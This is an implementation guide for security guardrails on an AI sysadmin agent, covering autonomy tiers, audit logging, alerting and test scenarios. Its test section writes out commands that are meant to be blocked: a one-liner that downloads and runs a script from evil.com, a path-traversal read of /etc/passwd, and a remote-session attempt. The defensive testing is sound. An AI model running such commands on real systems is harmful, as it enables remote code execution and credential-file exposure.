# AI Agent Guardrails - Implementation Guide

## Overview

This guide explains the enhanced AI agent guardrails for the WAiSA (Windows/Azure Infrastructure Sysadmin Agent) application. The guardrails provide enterprise-grade security without requiring external SIEM systems, with optional SIEM integration for future enhancement.

---

## What's Included

### ✅ **Immediate Security Controls (No SIEM Required)**

1. **Lateral Movement Prevention**
   - Blocks remote execution cmdlets (Enter-PSSession, Invoke-Command, etc.)
   - Restricts network access to localhost only
   - Prevents access to internal networks (10.x, 172.x, 192.168.x)
   - Network-level port blocking (SSH, RDP, WinRM)

2. **Safe Autonomous Information Gathering**
   - Whitelist of 60+ safe, read-only cmdlets
   - Rate limiting (100 queries/min, 1000/hour)
   - Anomaly detection based on baseline learning
   - Automatic pattern recognition

3. **Secure Script Staging**
   - Isolated temporary directories per session
   - Strict file permissions (read-only, write-only, append-only)
   - Static analysis with PSScriptAnalyzer
   - Pattern-based dangerous code detection
   - Auto-cleanup after 1 hour

4. **Command Whitelisting/Blacklisting**
   - Zero-trust whitelist-first approach
   - 30+ dangerous pattern detections
   - Multi-layer validation (syntax, blacklist, whitelist, semantic)
   - Input sanitization and encoding

5. **Sandboxing & Isolation**
   - Docker container isolation (optional)
   - Resource limits (CPU, memory, disk, network)
   - Read-only root filesystem
   - Non-root execution (UID 1000)

6. **Audit Logging**
   - **Local file logging** (JSON format, compressed)
   - **Azure Application Insights** (real-time telemetry)
   - PII/credential redaction
   - 90-day retention
   - Integrity checksums

7. **Rate Limiting**
   - Token bucket algorithm
   - Circuit breaker pattern
   - Resource quotas
   - Automatic throttling

8. **Input Validation**
   - 15+ jailbreak pattern detection
   - Command injection prevention
   - Path traversal blocking
   - Unicode normalization

9. **Privilege Control**
   - Never run as root
   - Azure Managed Identity (no hardcoded credentials)
   - Read-only RBAC roles
   - Blocked privilege escalation commands

10. **Network Access Controls**
    - Default deny policy
    - Azure services only
    - TLS 1.2+ required
    - DNS filtering

### 🔮 **Optional Features (Configure Later in Settings App)**

- SIEM Integration (Azure Sentinel, Splunk, Elastic)
- Slack/Teams notifications
- SMS alerts for critical incidents
- Advanced ML-based anomaly detection
- JIT (Just-In-Time) access workflows
- Two-person rule for critical operations
- Digital signatures for scripts

---

## File Structure

```
/home/sysadmin/sysadmin_in_a_box/
├── aiguardrails.md                          # Original guardrails (PowerShell-focused)
├── ai-agent-guardrails-enhanced.yml         # NEW: Comprehensive configuration
├── GUARDRAILS_IMPLEMENTATION_GUIDE.md       # This file
└── [TODO] Implementation files:
    ├── src/Security/
    │   ├── LateralMovementGuard.cs
    │   ├── SecureStagingManager.cs
    │   ├── CommandFilteringEngine.cs
    │   ├── InputValidator.cs
    │   ├── RateLimiter.cs
    │   └── AuditLogger.cs
    └── appsettings.Security.json
```

---

## Autonomy Tiers

The system uses a **progressive trust model** with 5 tiers:

| Tier | Name | Autonomy | Auto-Approve | Approval Required | Use Case |
|------|------|----------|--------------|-------------------|----------|
| **0** | Manual Review | 0% | None | Everything | New agents, high-risk ops |
| **1** | Read-Only | 25% | Get-*, Test-*, Measure-* | Write operations | Info gathering, diagnostics |
| **2** | Limited Write | 50% | Tier 1 + Restart-Service, logging | Stop-Service, config changes | Service management |
| **3** | Supervised | 75% | Tier 2 + Set-ItemProperty, New-Item | Deletions, critical changes | Routine maintenance |
| **4** | Full Autonomy | 100% | All (restricted environments) | None | **Lab/testing only** |

**Default**: All new agents start at **Tier 0** (Manual Review).

---

## Implementation Priority

### Phase 1: Immediate (This Week)

```yaml
priority: critical
estimated_hours: 16

tasks:
  1. Lateral Movement Prevention:
     - Implement LateralMovementGuard.cs
     - Add to command validation pipeline
     - Test with remote execution attempts
     hours: 4

  2. Secure Staging Directory:
     - Implement SecureStagingManager.cs
     - Create directory structure
     - Add cleanup jobs
     hours: 6

  3. Input Validation:
     - Implement InputValidator.cs
     - Add dangerous pattern detection
     - Test injection scenarios
     hours: 4

  4. Local Audit Logging:
     - Configure file logging
     - Set up Application Insights
     - Test log rotation
     hours: 2
```

### Phase 2: Week 2

```yaml
priority: high
estimated_hours: 12

tasks:
  5. Rate Limiting:
     - Implement token bucket algorithm
     - Add circuit breaker
     - Configure quotas
     hours: 4

  6. Command Whitelisting:
     - Build CommandFilteringEngine.cs
     - Load configuration from YAML
     - Create approval workflows
     hours: 6

  7. Sandbox Configuration:
     - Create Docker security profiles
     - Configure resource limits
     - Test isolation
     hours: 2
```

### Phase 3: Week 3-4

```yaml
priority: medium
estimated_hours: 16

tasks:
  8. Anomaly Detection:
     - Baseline learning implementation
     - Alert rule configuration
     - Dashboard setup
     hours: 8

  9. Settings App Integration:
     - Build configuration UI
     - Add SIEM connector placeholders
     - Notification channel setup
     hours: 6

  10. Testing & Documentation:
      - Security testing
      - Red team exercises
      - User documentation
      hours: 2
```

---

## Configuration Files

### Main Configuration: `ai-agent-guardrails-enhanced.yml`

This is the master configuration file with 10 major sections:

1. **lateral_movement** - Prevent remote execution
2. **information_gathering** - Safe read operations
3. **staging** - Secure script staging
4. **command_filtering** - Whitelist/blacklist
5. **sandboxing** - Execution isolation
6. **audit** - Logging without SIEM
7. **rate_limiting** - Resource constraints
8. **input_validation** - Injection prevention
9. **privilege_control** - Least privilege
10. **network_access** - Network restrictions

### Loading Configuration in C#

```csharp
// Startup.cs or Program.cs
var guardrailsConfig = new ConfigurationBuilder()
    .AddYamlFile("ai-agent-guardrails-enhanced.yml", optional: false)
    .Build();

services.Configure<AgentSecurityConfig>(
    guardrailsConfig.GetSection("agent_security")
);
```

---

## Audit Logging (Without SIEM)

### Current Setup

**Primary Destinations:**
1. **Local JSON Files**
   - Path: `/var/log/agent-audit/` (Linux) or `C:\Logs\AgentAudit\` (Windows)
   - Format: JSON (one per line)
   - Rotation: Daily
   - Compression: gzip
   - Retention: 90 days

2. **Azure Application Insights**
   - Real-time telemetry
   - Custom events for security
   - Built-in dashboards
   - KQL queries for analysis

### Log Structure

```json
{
  "timestamp": "2025-10-28T10:30:45.123Z",
  "event_id": "evt_abc123",
  "agent_id": "agent_xyz789",
  "session_id": "sess_mno345",
  "event_type": "command_execution",
  "severity": "info",
  "user_id": "user_stu901",

  "event_data": {
    "command": "Get-Service",
    "parameters": {"DisplayName": "MyApp*"},
    "result_status": "success",
    "execution_time_ms": 1250
  },

  "security_context": {
    "source_ip": "10.0.1.45",
    "authentication_method": "managed_identity",
    "authorization_decision": "allow"
  }
}
```

### Viewing Logs

**Local Files:**
```bash
# View recent logs
tail -f /var/log/agent-audit/$(date +%Y-%m-%d).log.json | jq .

# Search for security events
cat /var/log/agent-audit/*.log.json | jq 'select(.severity == "high")'

# Count events by type
cat /var/log/agent-audit/*.log.json | jq -r '.event_type' | sort | uniq -c
```

**Application Insights (KQL):**
```kql
// Security events in last 24 hours
customEvents
| where timestamp > ago(24h)
| where name == "SecurityEvent"
| where customDimensions.severity in ("high", "critical")
| project timestamp, customDimensions.event_type, customDimensions.agent_id
| order by timestamp desc

// Rate limit violations
customEvents
| where name == "RateLimitExceeded"
| summarize count() by bin(timestamp, 5m), tostring(customDimensions.agent_id)
| render timechart
```

### Future SIEM Integration

When ready to add SIEM, simply update the configuration:

```yaml
audit:
  destinations:
    event_hub:
      enabled: true  # Change from false
      connection_string: "${EVENTHUB_CONNECTION_STRING}"
      hub_name: "agent-audit-logs"

  siem:
    enabled: true  # Change from false
    type: "azure_sentinel"  # or splunk, elastic
    endpoint: "https://your-sentinel-workspace"
```

**No code changes required** - just configuration!

---

## Alerting (Without SIEM)

### Built-in Alert Rules

The system has **15 pre-configured alert rules** that work standalone:

**Critical Alerts (Immediate Action):**
- Privilege escalation attempt
- Lateral movement attempt
- Multiple failed authentications (3 in 5 min)

**High Alerts (Review Soon):**
- Blocked command execution
- Circuit breaker opened
- Unusual data access patterns

**Medium/Low Alerts (Monitor):**
- Rate limit exceeded
- High resource usage
- Execution timeouts

### Alert Destinations

**Currently Configured:**
1. **Application Insights** - All alerts
2. **Email** - Critical/High alerts (configure recipients in settings)

**Available for Later:**
3. Slack webhooks
4. Microsoft Teams
5. SMS (for critical only)
6. SIEM forwarding

### Example Email Alert

```
Subject: [CRITICAL] Agent Security Alert - Lateral Movement Attempt

Agent ID: agent_xyz789
Session: sess_mno345
Time: 2025-10-28 10:30:45 UTC

Event: Lateral movement attempt detected

Details:
- Command: Enter-PSSession -ComputerName prod-server-01
- User: john.doe@company.com
- Source IP: 10.0.1.45

Action Taken:
- Command blocked
- Agent quarantined
- Session terminated

Please review the agent's activity log for the full context.
```

---

## Testing the Guardrails

### Test Scenarios

**1. Lateral Movement Prevention**
```powershell
# This should be BLOCKED
Enter-PSSession -ComputerName remote-server

# Expected: CommandFilteringException
# Log: lateral_movement_attempt (severity: critical)
```

**2. Information Gathering (Should Work)**
```powershell
# This should be ALLOWED (Tier 1+)
Get-Service
Get-Process
Get-AzVM -Status

# Expected: Success, logged as info
```

**3. Dangerous Pattern Detection**
```powershell
# This should be BLOCKED
Invoke-Expression "$(wget http://evil.com/malware.ps1)"

# Expected: DangerousPatternException
# Log: dangerous_pattern_detected (severity: high)
```

**4. Rate Limiting**
```powershell
# Execute 101 commands in 60 seconds
# Expected: First 100 succeed, 101st gets rate limited
# Log: rate_limit_exceeded (severity: low)
```

**5. Staging Directory**
```powershell
# Create script in staging
$script = @"
Get-Service | Where-Object Status -eq 'Running'
"@

# This should succeed with validation
New-AgentScript -Content $script -Name "test.ps1"

# Try to access parent directory - should FAIL
New-AgentScript -Content "cat ../../etc/passwd" -Name "../evil.ps1"
# Expected: PathTraversalException
```

---

## Security Checklist

Before deploying to production:

- [ ] Review and customize `ai-agent-guardrails-enhanced.yml`
- [ ] Configure Application Insights connection string
- [ ] Set up email alert recipients
- [ ] Create Azure Managed Identity for agents
- [ ] Configure RBAC roles (read-only)
- [ ] Test lateral movement blocking
- [ ] Test dangerous pattern detection
- [ ] Verify audit logs are being written
- [ ] Test rate limiting and circuit breaker
- [ ] Create baseline with 7 days of normal activity
- [ ] Document approval workflows
- [ ] Train users on autonomy tiers
- [ ] Set up security dashboard
- [ ] Schedule regular security reviews (quarterly)

---

## Common Configuration Scenarios

### Scenario 1: Development Environment (Relaxed)

```yaml
agent_security:
  lateral_movement:
    enabled: true  # Still block remote execution

  command_filtering:
    strategy: "whitelist-first"

  rate_limiting:
    agent_limits:
      requests_per_minute: 1000  # Higher limits

  autonomy_tiers:
    tier_1_read_only:
      default_for_new_agents: true  # Start at Tier 1
```

### Scenario 2: Production Environment (Strict)

```yaml
agent_security:
  lateral_movement:
    enabled: true
    quarantine_agent: true  # Immediate quarantine

  command_filtering:
    strictness: "paranoid"

  approval_workflows:
    require_approval_for:
      write_operations: true
      configuration_changes: true

  autonomy_tiers:
    tier_0_manual:
      default_for_new_agents: true  # Start at Tier 0
```

### Scenario 3: Lab Environment (Testing)

```yaml
agent_security:
  lateral_movement:
    enabled: false  # Allow for testing

  autonomy_tiers:
    tier_4_full_autonomy:
      environment_restrictions:
        - "lab-only"
      additional_requirements:
        - "complete_audit_logging"
```

---

## Migrating from Original Guardrails

Your existing `aiguardrails.md` is PowerShell-specific and focuses on:
- 4-layer safety stack ✅ (Enhanced in new config)
- PSScriptAnalyzer ✅ (Integrated in staging validation)
- Sandbox execution ✅ (Extended with Docker support)
- Autonomy tiers ✅ (Expanded from 5 to detailed definitions)

**Migration Steps:**

1. **Keep** `aiguardrails.md` for PowerShell-specific patterns
2. **Use** `ai-agent-guardrails-enhanced.yml` as the master config
3. **Merge** PowerShell allowlist into `allowed_cmdlets` section
4. **Add** your custom dangerous patterns to `blocked_patterns`
5. **Configure** JEA (Just Enough Administration) separately for Windows

---

## Support & Troubleshooting

### Issue: Agent blocked unexpectedly

**Check:**
1. Review audit logs: `cat /var/log/agent-audit/$(date +%Y-%m-%d).log.json | jq 'select(.event_type == "command_blocked")'`
2. Verify command is in whitelist
3. Check rate limits not exceeded
4. Review autonomy tier for agent

### Issue: Too many false positives

**Solution:**
1. Adjust `sensitivity` in anomaly detection (set to "low")
2. Extend `baseline_learning_days` to 30
3. Add legitimate patterns to whitelist
4. Fine-tune dangerous pattern regexes

### Issue: Logs growing too large

**Solution:**
1. Enable compression: `compress: true`
2. Reduce retention: `retention_days: 30`
3. Set log level to "standard" instead of "detailed"
4. Enable log rotation

---

## Next Steps

1. **Review** the `ai-agent-guardrails-enhanced.yml` configuration
2. **Customize** allowed cmdlets and blocked patterns for your environment
3. **Implement** Phase 1 controls (lateral movement, staging, input validation)
4. **Test** thoroughly in development environment
5. **Establish** baseline behavior (7-30 days)
6. **Deploy** to production with Tier 0 (Manual Review)
7. **Gradually** promote agents to higher tiers based on trust
8. **Build** settings app for SIEM integration later

---

## Questions?

Common questions:

**Q: Do I need Docker for sandboxing?**
A: No, sandboxing can use process isolation. Docker is optional but recommended.

**Q: Can I use this without Azure?**
A: Yes! Disable Azure-specific features and use local file logging only.

**Q: How do I add SIEM later?**
A: Just update the `siem` section in the YAML config. No code changes needed.

**Q: What if I don't have Application Insights?**
A: Disable it in the config. Local file logging works standalone.

---

## References

- Original Guardrails: `./aiguardrails.md`
- Enhanced Config: `./ai-agent-guardrails-enhanced.yml`
- OWASP Agentic AI Security: https://owasp.org/www-project-top-10-for-large-language-model-applications/
- NIST AI RMF: https://www.nist.gov/itl/ai-risk-management-framework
- MITRE ATLAS: https://atlas.mitre.org/
- Azure Security Best Practices: https://learn.microsoft.com/en-us/azure/security/

---

**Last Updated:** 2025-10-28
**Version:** 1.0
**Maintainer:** WAiSA Security Team
